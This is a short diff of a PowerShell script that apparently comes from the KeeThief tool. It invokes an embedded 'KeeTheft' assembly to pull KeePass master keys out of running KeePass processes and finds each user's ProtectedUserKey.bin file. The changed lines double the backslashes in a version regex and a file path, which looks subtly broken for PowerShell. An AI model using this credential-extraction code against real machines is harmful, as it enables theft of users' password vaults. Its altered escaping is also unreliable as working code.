@@ -3587,7 +3587,7 @@ XVob7oHI3Uvmf7I2365Vv2Pdalf2DwHKtyt5BvVP67/20MiST9Mcd/8X7+P9//tf+/B8='
     }
     PROCESS {
         ForEach($KeePassProcess in $Process) {
-            if($KeePassProcess.FileVersion -match '^2\.') {
+            if($KeePassProcess.FileVersion -match '^2\\.') {
                 $WMIProcess = Get-WmiObject win32_process -Filter "ProcessID = $($KeePassProcess.ID)"
                 $ExecutablePath = $WMIProcess | Select-Object -Expand ExecutablePath
                 $Keys = $Assembly.GetType('KeeTheft.Program').GetMethod('GetKeePassMasterKeys').Invoke($null,
@@ -3617,7 +3617,7 @@ XVob7oHI3Uvmf7I2365Vv2Pdalf2DwHKtyt5BvVP67/20MiST9Mcd/8X7+P9//tf+/B8='
                                     $UserName = $WMIProcess.GetOwner().User
                                     $ProtectedUserKeyPath = Resolve-Path -Path `
                                     "$($Env:WinDir | Split-Path -Qualifier)`
-                                    \Users\*$UserName*\AppData\Roaming\KeePass\ProtectedUserKey.bin" `
+                                    \\Users\\*$UserName*\\AppData\\Roaming\\KeePass\\ProtectedUserKey.bin" `
                                     -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Path
                                     $UserKeyObject | Add-Member Noteproperty 'KeyFilePath' $ProtectedUserKeyPath
                                 }
